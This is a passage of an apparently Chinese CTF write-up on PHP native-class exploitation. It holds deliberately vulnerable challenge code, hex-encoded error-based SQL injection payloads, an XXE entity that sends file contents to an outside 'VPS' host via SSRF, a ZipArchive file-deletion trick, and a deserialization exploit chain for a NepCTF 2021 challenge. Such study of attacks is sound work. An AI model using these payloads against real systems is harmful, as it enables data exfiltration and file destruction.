<span class="hljs-class">		<span class="hljs-title">dp</span>.<span class="hljs-title">SyntaxHighlighter</span>.<span class="hljs-title">HighlightAll</span>('<span class="hljs-title">code</span>');</span>
<span class="hljs-class">	&lt;/<span class="hljs-title">script</span>&gt; </span>
<span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span>
<span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre>
<p><strong>SQL二次注入</strong></p>
<p>index.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-keyword">include</span>(<span class="hljs-string">"function.php"</span>);
    <span class="hljs-keyword">include</span>(<span class="hljs-string">"config.php"</span>);
 
    <span class="hljs-variable">$username</span>=<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'user'</span>]);
    <span class="hljs-variable">$check_code</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'cookie-check'</span>];
    <span class="hljs-variable">$check_sql</span>=<span class="hljs-string">"select password from user where username='"</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">"'"</span>;
    <span class="hljs-variable">$check_sum</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$username</span>.<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-variable">$check_sql</span>,<span class="hljs-variable">$mysql</span>)[<span class="hljs-string">'0'</span>][<span class="hljs-string">'0'</span>]);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$check_sum</span>!==<span class="hljs-variable">$check_code</span>){
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
    }
<span class="hljs-meta">?&gt;</span>
<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">"./calc.php"</span>);<span class="hljs-meta">?&gt;</span></code></pre>
<p>function.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_result</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>,<span class="hljs-variable">$mysql</span></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$mysql</span>,<span class="hljs-variable">$sql</span>)){
        <span class="hljs-variable">$result_array</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_all</span>(<span class="hljs-variable">$result</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result_array</span>;
    }<span class="hljs-keyword">else</span>{
         <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$mysql</span>);
         <span class="hljs-keyword">return</span> <span class="hljs-string">"Failed"</span>;
    }
}
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"><span class="hljs-variable">$mysql</span></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>){
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'size'</span>]&gt;<span class="hljs-number">2</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"File is larger than 2M, forbidden upload"</span>);
        }
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>])){
            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-string">"select * from file where filename='"</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]).<span class="hljs-string">"'"</span>,<span class="hljs-variable">$mysql</span>)){
                <span class="hljs-variable">$filehash</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());
                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-string">"insert into file(filename,filehash,sig) values('"</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]).<span class="hljs-string">"','"</span>.<span class="hljs-variable">$filehash</span>.<span class="hljs-string">"',"</span>.(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'sig'</span>]),<span class="hljs-string">")"</span>)?<span class="hljs-string">""</span>:<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'sig'</span>])).<span class="hljs-string">")"</span>,<span class="hljs-variable">$mysql</span>)==<span class="hljs-string">"Failed"</span>) 
                    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Upload failed"</span>);
                <span class="hljs-variable">$new_filename</span>=<span class="hljs-string">"./upload/"</span>.<span class="hljs-variable">$filehash</span>.<span class="hljs-string">".txt"</span>;
                <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>], <span class="hljs-variable">$new_filename</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Upload failed"</span>);
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"Your file "</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]).<span class="hljs-string">" upload successful."</span>);
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-variable">$hash</span>=<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-string">"select filehash from file where filename='"</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]).<span class="hljs-string">"'"</span>,<span class="hljs-variable">$mysql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Upload failed"</span>);
                <span class="hljs-variable">$new_filename</span>=<span class="hljs-string">"./upload/"</span>.<span class="hljs-variable">$hash</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>].<span class="hljs-string">".txt"</span>;
                <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>], <span class="hljs-variable">$new_filename</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Upload failed"</span>);
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"Your file "</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]).<span class="hljs-string">" upload successful."</span>);
            }
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Not upload file"</span>);
        }
    }
}
 
 
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">w_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$string</span>));
}
 
 
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_api</span>(<span class="hljs-params"><span class="hljs-variable">$module</span>,<span class="hljs-variable">$args</span></span>)</span>{
    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-variable">$module</span>);
    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$class</span>-&gt;<span class="hljs-title function_ invoke__">newInstanceArgs</span>(<span class="hljs-variable">$args</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>show.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-keyword">include</span>(<span class="hljs-string">"function.php"</span>);
    <span class="hljs-keyword">include</span>(<span class="hljs-string">"config.php"</span>);
    <span class="hljs-keyword">include</span>(<span class="hljs-string">"calc.php"</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'action'</span>])&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'action'</span>]==<span class="hljs-string">"view"</span>){
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"REMOTE_ADDR"</span>]!==<span class="hljs-string">"127.0.0.1"</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">"Forbidden."</span>);
        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>])){
            <span class="hljs-variable">$file_info</span>=<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-string">"select * from file where filename='"</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>]).<span class="hljs-string">"'"</span>,<span class="hljs-variable">$mysql</span>);
            <span class="hljs-variable">$file_name</span>=<span class="hljs-variable">$file_info</span>[<span class="hljs-string">'0'</span>][<span class="hljs-string">'2'</span>];
            <span class="hljs-keyword">echo</span>(<span class="hljs-string">"file code: "</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">"./upload/"</span>.<span class="hljs-variable">$file_name</span>.<span class="hljs-string">".txt"</span>));
            <span class="hljs-variable">$new_sig</span>=<span class="hljs-title function_ invoke__">mt_rand</span>();
            <span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-string">"update file set sig='"</span>.<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$new_sig</span>).<span class="hljs-string">"' where id="</span>.<span class="hljs-variable">$file_info</span>[<span class="hljs-string">'0'</span>][<span class="hljs-string">'0'</span>].<span class="hljs-string">" and sig='"</span>.<span class="hljs-variable">$file_info</span>[<span class="hljs-string">'0'</span>][<span class="hljs-string">'3'</span>].<span class="hljs-string">"'"</span>,<span class="hljs-variable">$mysql</span>);
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"&lt;br&gt;new sig:"</span>.<span class="hljs-variable">$new_sig</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Null filename"</span>);
        }
    }
 
    <span class="hljs-variable">$username</span>=<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'user'</span>]);
    <span class="hljs-variable">$check_code</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'cookie-check'</span>];
    <span class="hljs-variable">$check_sql</span>=<span class="hljs-string">"select password from user where username='"</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">"'"</span>;
    <span class="hljs-variable">$check_sum</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$username</span>.<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-variable">$check_sql</span>,<span class="hljs-variable">$mysql</span>)[<span class="hljs-string">'0'</span>][<span class="hljs-string">'0'</span>]);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$check_sum</span>!==<span class="hljs-variable">$check_code</span>){
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
    }
 
    <span class="hljs-variable">$module</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'module'</span>];
    <span class="hljs-variable">$args</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'args'</span>];
    <span class="hljs-title function_ invoke__">do_api</span>(<span class="hljs-variable">$module</span>,<span class="hljs-variable">$args</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>show.php中，限制了 ip 只能是<code>127.0.0.1</code>，说明只能通过 XXE 去触发SSRF。这里根据<code>filename</code>获取数据库中的 <code>sig</code> 然后进行 update 操作，但没有对 <code>sig</code> 值进行过滤，导致二次注入。</p>
<p>再看一下<code>function.php</code>中的<code>upload_file()</code>上传文件部分，首先他会判断 filename 是否存在，如果不存在就会插入数据库，这里 <code>sig</code> 没有用单引号保护，但是用了 <code>addslashes()</code> 进行转义，而我们要插入二次注入的语句必须得有单引号，这个时候就可以用 hex 编码进行绕过。</p>
<p>因为<code>sql_result()</code>函数中会输出 sql 错误，所以我们用 updatexml 函数进行报错注入。构造 payload:</p>
<p><strong>数据库可以识别16进制并解码</strong></p>
<pre><code class="hljs plaintext">'||extractvalue(1,concat(0x7e,(select flag from flag),0x7e))||'
//hex编码之后
0x277C7C6578747261637476616C756528312C636F6E63617428307837652C2873656C65637420666C61672066726F6D20666C6167292C3078376529297C7C27
 
//由于报错的字符数有限制，需要用reverse再输出一次
'||extractvalue(1,concat(0x7e,(select reverse(flag) from flag),0x7e))||'
//hex编码之后
0x277c7c6578747261637476616c756528312c636f6e63617428307837652c2873656c656374207265766572736528666c6167292066726f6d20666c6167292c3078376529297c7c27</code></pre>
<p>修改send.xml</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">payl</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">"php://filter/read=convert.base64-encode/resource=http://127.0.0.1/show.php?action=view&amp;filename=1.txt"</span>&gt;</span>
<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'https://VPS/?%payl;'&gt;"</span>&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625162643118.png" alt="image-20230625162643118"></p>
<p>上传成功之后再利用SimpleXMLElement类进行SSRF，也就是访问URL：</p>
<pre><code class="hljs http">/show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true</code></pre>
<p>之后查看web访问日志，将得到的结果base64解码之后即可。<strong>（注意由于分了2次上传，因此两次的文件名字需要不一样才行）</strong></p>
<p>这里不知道为啥一直实现不了,就看个思路吧…</p>
<h3 id="105-ziparchive-类来删除文件">10.5 ZipArchive 类来删除文件</h3>
<h4 id="ziparchive-类">ZipArchive 类</h4>
<p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。</p>
<p>下面列举几个常见的类方法：</p>
<pre><code class="hljs php">- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">addEmptyDir</span>`：添加一个新的文件目录
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">addFile</span>`：将文件添加到指定zip压缩包中
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">addFromString</span>`：添加新的文件同时将内容添加进去
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">close</span>`：关闭ziparchive
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">extractTo</span>`：将压缩包解压
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">open</span>`：打开一个zip压缩包
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">deleteIndex</span>`：删除压缩包中的某一个文件，如：`<span class="hljs-title function_ invoke__">deleteIndex</span>(<span class="hljs-number">0</span>)`代表删除第一个文件
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">deleteName</span>`：删除压缩包中的某一个文件名称，同时也将文件删除
- ……</code></pre>
<p>我们来重点看看 <code>ZipArchive::open</code> 方法：</p>
<pre><code class="hljs plaintext">ZipArchive::open ( string $filename [, int $flags ] ) : mixed</code></pre>
<p>该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</p>
<pre><code class="hljs plaintext">- `$filename`：要打开的ZIP存档的文件名。
- `$flags`：用于打开档案的模式。有以下几种模式：
- `ZipArchive::OVERWRITE`：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。
- `ZipArchive::CREATE`：如果不存在则创建一个zip压缩包。
- `ZipArchive::RDONLY`：只读模式打开压缩包。
- `ZipArchive::EXCL`：如果压缩包已经存在，则出错。
- `ZipArchive::CHECKCONS`：对压缩包执行额外的一致性检查，如果失败则显示错误。</code></pre>
<p>注意，如果设置flags参数的值为 <code>ZipArchive::OVERWRITE</code> 的话，可以把指定文件删除。这里我们跟进方法可以看到<code>const OVERWRITE = 8</code>，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将<code>$flags</code>赋值为8。</p>
<p>也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。</p>
<p>example：</p>
<pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();
<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">'1.txt'</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">OVERWRITE</span>);  
<span class="hljs-comment">// ZipArchive::OVERWRITE:  总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖</span>
<span class="hljs-comment">// 因为没有保存，所以效果就是删除了1.txt</span></code></pre>
<p><strong>[NepCTF 2021]梦里花开牡丹亭</strong></p>
<p>找了半天没找到复现环境，就跟着wp走一遍吧</p>
<p>进入题目，给出源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span>(<span class="hljs-string">'shell.php'</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Game</span></span>{
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$password</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$choice</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$register</span>;
 
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span>;
 
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">'user'</span>;
        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-string">'user'</span>;
    }
 
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;register)===<span class="hljs-string">"21232f297a57a5a743894a0e4a801fc3"</span>){    <span class="hljs-comment">// admin</span>
            <span class="hljs-variable language_">$this</span>-&gt;choice=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-variable">$this</span>-&gt;content);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-variable language_">$this</span>-&gt;choice = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">register</span>();
        }
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;choice-&gt;<span class="hljs-title function_ invoke__">checking</span>(<span class="hljs-variable">$this</span>-&gt;username,<span class="hljs-variable">$this</span>-&gt;password);
    }
 
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">login</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;
 
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>,<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$content</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;
        <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$filename</span>;
        <span class="hljs-variable language_">$this</span>-&gt;content=<span class="hljs-variable">$content</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checking</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>===<span class="hljs-string">'admin'</span>&amp;&amp;<span class="hljs-variable">$password</span>===<span class="hljs-string">'admin'</span>){
            <span class="hljs-variable language_">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-variable">$this</span>-&gt;content);
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'login success you can to open shell file!'</span>);
        }
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">register</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checking</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>===<span class="hljs-string">'admin'</span>&amp;&amp;<span class="hljs-variable">$password</span>===<span class="hljs-string">'admin'</span>){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'success register admin'</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'please register admin '</span>);
        }
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Open</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span></span>)</span>{
        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'waf.txt'</span>)){    <span class="hljs-comment">// 当waf.txt没读取成功时才能得到flag</span>
            <span class="hljs-title function_ invoke__">shell</span>(<span class="hljs-variable">$content</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>.<span class="hljs-string">".php"</span>);    <span class="hljs-comment">// filename=php://filter/read=convert.base64-encode/resource=shell</span>
        }
    }
}
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>]!==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>]&amp;&amp;(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>])) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>])=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>]))){
    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'unser'</span>]));
}</code></pre>
<p>这是一道反序列化题目，但是前面加了一个简单的PHP特性。</p>
<p><strong>1. 数组绕过哈希比较</strong></p>
<p>由于<code>md5()</code>和<code>sha1()</code>函数都无法处理数组，因此传入一个数组会返回false。因此这里可以绕过需要两个不同的数但是其哈希值要相等。</p>
<p>example：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625191721351.png" alt="image-20230625191721351"></p>
<p><strong>2. 利用php://filter读文件</strong></p>
<p>我们可以看到Open类里面的<code>open()</code>方法，当<code>waf.txt</code>文件存在的时候会执行<code>echo file_get_contents($filename.".php");</code>，而调用这个类方法是在Login类里面的<code>checking()</code>方法，</p>
<p>而调用Login类的<code>checking()</code>方法的是Game类里面的<code>__destruct()</code>内置方法，因此我们就能够找到一条完整的利用链了，POC：</p>
<p>自己大概也打通了，不错…</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Game</span></span>{
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$password</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$choice</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$register</span>;
 
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span>;
}
 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">login</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;   
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;
}
 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Open</span></span>{
 
}
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Game</span>();
<span class="hljs-variable">$poc</span>-&gt;username = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;password = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;register = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Open</span>();
<span class="hljs-variable">$poc</span>-&gt;filename = <span class="hljs-string">"php://filter/read=convert.base64-encode/resource=shell"</span>;
<span class="hljs-variable">$poc</span>-&gt;content = <span class="hljs-string">"xxx"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));
<span class="hljs-meta">?&gt;</span></code></pre>
<p>得到：</p>
<pre><code class="hljs plaintext">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1zaGVsbCI7czo3OiJjb250ZW50IjtzOjM6IjEyMyI7fQ==</code></pre>
<p>执行payload读取到shell.php的源码base64编码：</p>
<p>果然啊，复现的时候，发现原来是waf.txt没创建，导致代码走不通…</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625202537692.png" alt="image-20230625202537692"></p>
<p>shell.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shell</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>)&lt;<span class="hljs-number">10</span>){
